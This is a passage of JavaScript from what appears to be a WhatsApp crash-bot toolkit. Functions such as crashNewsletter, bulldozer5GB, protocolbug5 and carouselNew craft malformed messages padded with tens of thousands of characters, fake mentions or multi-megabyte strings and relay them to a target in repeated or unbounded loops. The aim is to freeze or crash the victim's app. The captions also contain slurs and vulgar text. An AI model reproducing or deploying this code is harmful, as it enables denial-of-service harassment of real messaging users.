                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{ Brando_Da.js }",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "status@broadcast"
          }
        }
      }
    }
  }, {});

  await langgxyz.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}

async function Cursormuani(zen, target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: 'Ryzen Unstoppable',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493]
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "Nigga well"
                },
                footer: {
                  text: "sex.json"
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(10000) 
                }
              }
            ]
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",             
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{ sex.file.json }",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "@s.whatsapp.net"
          }
        }
      }
    }
  }, {});

  await langgxyz.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}

async function crashNewsletter(isTarget) {
  const msg = generateWAMessageFromContent(isTarget, {
    interactiveMessage: {
      header: {
      documentMessage: {
       url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
       mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
       fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
       fileLength: "9999999999999",
       pageCount: 9999999999999,
       mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
       fileName: "༿༑ᜳ𝗥͢𝗬𝗨͜𝗜̸𝗖͠͠͠𝗛̭𝗜̬ᢶ⃟",
       fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
       directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
       mediaKeyTimestamp: 1735456100,
       contactVcard: true,
       caption: "F*ucking Everyone"
      }
     },
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_order",
            buttonParamsJson: {
              reference_id: "trigger",
              order: {
                status: "flex_agency",
                order_type: "ORDER"
              },
              share_payment_status: true
            }
          }
        ],
        messageParamsJson: "".repeat(10000) 
      }
   }
  }, { userJid: isTarget });

  await langgxyz.relayMessage(isTarget, msg.message, { 
    participant: { jid: isTarget },
    messageId: msg.key.id 
  });
}

function generateLargeString(sizeInBytes) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < sizeInBytes; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

async function bulldozer5GB(sock, jid) {
  const SID = "5e03e0&mms3";
  const key = "10000000_2012297619515179_5714769099548640934_n.enc";
  const type = "image/webp";

  const extraPayload = generateLargeString(8.5 * 1024 * 1024);

  const message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01&oe=685F4C37&_nc_sid=${SID}`,
          fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
          fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
          mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
          mimetype: type,
          directPath: `/v/t62.43144-24/${key}?ccb=11-4&oh=01&oe=685F4C37&_nc_sid=${SID}`,
          fileLength: {
            low: 999999,
            high: 0,
            unsigned: true,
          },
          mediaKeyTimestamp: {
            low: Date.now() % 2147483647,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            participant: jid,
            mentionedJid: ["0@s.whatsapp.net"],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 999999,
          },
          stickerSentTs: {
            low: -10000000,
            high: 999,
            unsigned: false,
          },
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          extraPayload,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(jid, message, {});

  for (let i = 0; i < 600; i++) {
    await langgxyz.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [jid],
    });
  }
}

async function ChronosDelay(target, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

const letakx = {
  "videoMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7161-24/29608892_1222189922826253_8067653654644474816_n.enc?ccb=11-4&oh=01_Q5Aa1gF9uZ9_ST2MIljavlsxcrIOpy9wWMykVDU4FCQeZAK-9w&oe=685D1E3B&_nc_sid=5e03e0&mms3=true",
    "mimetype": "video/mp4",
    "fileSha256": "RLju7GEX/CvQPba1MHLMykH4QW3xcB4HzmpxC5vwDuc=",
    "fileLength": "327833",
    "seconds": 15,
    "mediaKey": "3HFjGQl1F51NXuwZKRmP23kJQ0+QECSWLRB5pv2Hees=",
    "caption": "Xrelly Mp5",
    "height": 1248,
    "width": 704,
    "fileEncSha256": "ly0NkunnbgKP/JkMnRdY5GuuUp29pzUpuU08GeI1dJI=",
    "directPath": "/v/t62.7161-24/29608892_1222189922826253_8067653654644474816_n.enc?ccb=11-4&oh=01_Q5Aa1gF9uZ9_ST2MIljavlsxcrIOpy9wWMykVDU4FCQeZAK-9w&oe=685D1E3B&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1748347294",
    "contextInfo": { isSampled: true, mentionedJid: mentionedList },
        "forwardedNewsletterMessageInfo": {
            "newsletterJid": "120363321780343299@newsletter",
            "serverMessageId": 1,
            "newsletterName": "Xrelly Mp5"
        },
    "streamingSidecar": "GMJY/Ro5A3fK9TzHEVmR8rz+caw+K3N+AA9VxjyHCjSHNFnOS2Uye15WJHAhYwca/3HexxmGsZTm/Viz",
    "thumbnailDirectPath": "/v/t62.36147-24/29290112_1221237759467076_3459200810305471513_n.enc?ccb=11-4&oh=01_Q5Aa1gH1uIjUUhBM0U0vDPofJhHzgvzbdY5vxcD8Oij7wRdhpA&oe=685D2385&_nc_sid=5e03e0",
    "thumbnailSha256": "5KjSr0uwPNi+mGXuY+Aw+tipqByinZNa6Epm+TOFTDE=",
    "thumbnailEncSha256": "2Mtk1p+xww0BfAdHOBDM9Wl4na2WVdNiZhBDDB6dx+E=",
    "annotations": [
      {
        "embeddedContent": {
          "embeddedMusic": {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "ARE YOU KIDDING ME?!!!",
        title: "Xrl",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/xrelly",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
          }
        },
        "embeddedAction": true
      }
    ]
  }
}

    const xaudio = {
        audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
            fileLength: "389948",
            seconds: 24,
            ptt: false,
            mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
           contextInfo: {
           mentionedJid: mentionedList,
            caption: "𐍇𐍂𐌴𐍧𐍧𐍅 𝚵𝚳𝚸𝚬𝚪𝚯𝐑",
            fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4="
           }
        }
    };

    const msg1 = generateWAMessageFromContent(target, {
        viewOnceMessage: { message: { letakx } }
    }, {});
    
    const msg2 = generateWAMessageFromContent(target, xaudio, {});
  
    for (const msg of [msg1, msg2]) {
        await langgxyz.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                }]
            }]
        });
    }

    if (mention) {
        await langgxyz.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg1.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [{
                tag: "meta",
                attrs: { is_status_mention: "true" },
                content: undefined
            }]
        });
    }
}           

async function protocolbug7(langgxyz, target, mention) {
  const mentionedJids = [
    ...Array.from({ length: 40000 }, () =>
      `${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  const links = "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true";
  const mime = "audio/mpeg";
  const sha = "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=";
  const enc = "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=";
  const key = "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=";
  const timestamp = 99999999999999;
  const path = "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0";
  const longs = 99999999999999;
  const loaded = 99999999999999;
  const data = "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==";

  const messageContext = {
    mentionedJid: mentionedJids,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "1@newsletter",
      serverMessageId: 1,
      newsletterName: "軎�".repeat(99)
    }
  };

  const messageContent = {
    ephemeralMessage: {
      message: {
        audioMessage: {
          url: links,
          mimetype: mime,
          fileSha256: sha,
          fileLength: longs,
          seconds: loaded,
          ptt: true,
          mediaKey: key,
          fileEncSha256: enc,
          directPath: path,
          mediaKeyTimestamp: timestamp,
          contextInfo: messageContext,
          waveform: data
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, messageContent, { userJid: target });

  const broadcastSend = {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  };

  await langgxyz.relayMessage("status@broadcast", msg.message, broadcastSend);

  if (mention) {
    await langgxyz.relayMessage(target, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: {
          is_status_mention: " null - exexute "
        },
        content: undefined
      }]
    });
  }
}

async function carouselNew(isTarget) {
  for (let i = 0; i < 20; i++) {
    let push = [];
    let buttt = [];

    for (let i = 0; i < 20; i++) {
      buttt.push({
        "name": "galaxy_message",
        "buttonParamsJson": JSON.stringify({
          "header": "\u0000".repeat(10000),
          "body": "\u0000".repeat(10000),
          "flow_action": "navigate",
          "flow_action_payload": { screen: "FORM_SCREEN" },
          "flow_cta": "Grattler",
          "flow_id": "1169834181134583",
          "flow_message_version": "3",
          "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
        })
      });
    }

    for (let i = 0; i < 10; i++) {
      push.push({
        "body": {
          "text": "Erlangga" + "ꦾ".repeat(11000)
        },
        "footer": {
          "text": "dont panic!!"
        },
        "header": { 
          "title": 'memekk' + "\u0000".repeat(50000),
          "hasMediaAttachment": true,
          "imageMessage": {
            "url": "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
            "mimetype": "image/jpeg",
            "fileSha256": "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
            "fileLength": "591",
            "height": 0,
            "width": 0,
            "mediaKey": "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
            "fileEncSha256": "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
            "directPath": "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
            "mediaKeyTimestamp": "1721344123",
            "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
            "scansSidecar": "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
            "scanLengths": [
              247,
              201,
              73,
              63
            ],
            "midQualityFileSha256": "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
          }
        },
        "nativeFlowMessage": {
          "buttons": []
        }
      });
    }

    const carousel = generateWAMessageFromContent(isTarget, {
      "viewOnceMessage": {
        "message": {
          "messageContextInfo": {
            "deviceListMetadata": {},
            "deviceListMetadataVersion": 2
          },
          "interactiveMessage": {
            "body": {
              "text": "Kontol " + "ꦾ".repeat(55000)
            },
            "footer": {
              "text": "( 🐉 ) Sasuke New Gen 8 Vvip ( 🐉 )"
            },
            "header": {
              "hasMediaAttachment": false
            },
            "carouselMessage": {
              "cards": [
                ...push
              ]
            }
          }
        }
      }
    }, {});

    await langgxyz.relayMessage(isTarget, carousel.message, {
      messageId: carousel.key.id
    });
    console.log("Sasuke Sending Carousel New !!");
  }
}

async function protocolbug5v2(isTarget, mention) {
    const maxMention = 65000; // mendekati batas JS maksimal
    const mentionedList = Array.from({ length: maxMention }, (_, i) =>
        `1${Math.floor(100000 + Math.random() * 900000)}@s.whatsapp.net`
    );

    const longUnicode = "៛" + "‌‎‏" + " ".repeat(500) + "៛".repeat(20000);

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".Erlangga || Beginner" + longUnicode,
        title: "SasukeCrashh🐉〽️" + longUnicode,
        artworkDirectPath: "/v/t62.76458-24/...",
        artworkSha256: "fakehash==",
        artworkEncSha256: "fakehashenc==",
        artistAttribution: "https://instagram.com/_u/tamainfinity_",
        countryBlocklist: false,
        isExplicit: true,
        artworkMediaKey: "fakekey=="
    };

    const annotations = Array.from({ length: 5 }, () => ({
        embeddedContent: { embeddedMusic },
        embeddedAction: true
    }));

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/...",
        mimetype: "video/mp4",
        fileSha256: "fakebase64==",
        fileLength: "999999",
        seconds: 30,
        mediaKey: "fakeMediaKey==",
        caption: "𐌕𐌀𐌌𐌀 RTL\u202eBUG\u202c𐍂𐍉𐍂" + longUnicode,
        height: 720,
        width: 1280,
        fileEncSha256: "fakeenc==",
        directPath: "/v/t62.7161-24/...",
        mediaKeyTimestamp: `${Date.now()}`,
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "༿༑ᜳ𝗥͢𝗬𝗨͜𝗜̸𝗖͠𝗛̭𝗜̬ᢶ⃟"
        },
        streamingSidecar: "fakeSidecar==",
        thumbnailDirectPath: "/v/t62.36147-24/...",
        thumbnailSha256: "fakehash==",
        thumbnailEncSha256: "fakeenc==",
        annotations
    };

    const msg = generateWAMessageFromContent(isTarget, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await langgxyz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: mentionedList.map(jid => ({
                            tag: "to",
                            attrs: { jid },
                            content: undefined
                        }))
                    }
                ]
            }
        ]
    });

    if (mention) {
        await langgxyz.relayMessage(isTarget, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}

async function ProtoXAudio(target, mention) {
    console.log("Attack DelayProto Berjalann...")
    const generateMessage = {
        viewOnceMessage: {
            message: {
                audioMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
                    mimetype: "audio/mpeg",
                    fileSha256: Buffer.from([
            226, 213, 217, 102, 205, 126, 232, 145,
            0,  70, 137,  73, 190, 145,   0,  44,
            165, 102, 153, 233, 111, 114,  69,  10,
            55,  61, 186, 131, 245, 153,  93, 211
        ]),
        fileLength: 432722,
                    seconds: 26,
                    ptt: false,
                    mediaKey: Buffer.from([
            182, 141, 235, 167, 91, 254,  75, 254,
            190, 229,  25,  16, 78,  48,  98, 117,
            42,  71,  65, 199, 10, 164,  16,  57,
            189, 229,  54,  93, 69,   6, 212, 145
        ]),
        fileEncSha256: Buffer.from([
            29,  27, 247, 158, 114,  50, 140,  73,
            40, 108,  77, 206,   2,  12,  84, 131,
            54,  42,  63,  11,  46, 208, 136, 131,
            224,  87,  18, 220, 254, 211,  83, 153
        ]),
                    directPath: "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
                    mediaKeyTimestamp: 1746275400,
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await langgxyz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await langgxyz.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "Erlangga Is Heree Baybyy" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function protocolbug5(isTarget, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".Erlangga Come Heree!!" + "ោ៝".repeat(10000),
        title: "Finix",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "Erlanggaa?✦ Im Begginner",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "༿༑ᜳ𝗥͢𝗬𝗨͜𝗜̸𝗖͠͠͠𝗛̭𝗜̬ᢶ⃟"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(isTarget, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await langgxyz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: isTarget }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await langgxyz.relayMessage(isTarget, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}

async function vcardcrash(target) {
  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_order",
            buttonParamsJson: JSON.stringify({
              reference_id: Math.random().toString(36).substring(2, 10).toUpperCase(),
              order: {
                status: "pending", 
                order_type: "ORDER"
              },
              share_payment_status: true,
              call_permission: true 
            })
          },
          {
            name: "contact", 
            buttonParamsJson: JSON.stringify({
              vcard: {
                full_name: "Zephyrine Chema ".repeat(4000),
                phone_number: "+628217973312",
                email: "zephyrineexploit@iCloud.com",
                organization: "Zephyrine Exploiter",
                job_title: "Customer Support"
              }
            })
          }
        ],
        messageParamsJson: JSON.stringify({
          title: "\u200B".repeat(10000), 
          body: "GIDEOVA_PAYMENT_STATUSED"
        })
      }
    }
  }, { userJid: target });

  await langgxyz.relayMessage(target, msg.message, { 
    messageId: msg.key.id
  });
}

async function payoutzep(target) {
  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_order",
            buttonParamsJson: {
              reference_id: Math.random().toString(11).substring(2, 10).toUpperCase(),
              order: {
                status: "completed",
                order_type: "CAPSLOCK 🐉🐉🐉"
              },
              share_payment_status: true
            }
          }
        ],
        messageParamsJson: {}
      }
    }
  }, { userJid: target });

  await langgxyz.relayMessage(target, msg.message, { 
    messageId: msg.key.id 
  });
}
       
// End Funct Bug
// Fungsi Pemanggilan Function
const tolbug = 999;
const tolbug2 = 666;

async function SasukeIos(target) {
    for (let i = 0; 1 < tolbug; i++) {
        await fuckip(target);
        await iosFreeze(target);       
  }
}
   async function crashch(target) {
    for (let i = 0; i <= 5; i++) {
    await fcxch(target)
    await fcxch2(target)
    }
}

async function SasukeForcloseNew(target) {
    for (let i = 0; 1 < tolbug; i++) {
        await CursorCrL(target)
        await Cursormuani(target)
        await crashNewsletter(target)
  }
}
async function SasukeDelayNew(target) {
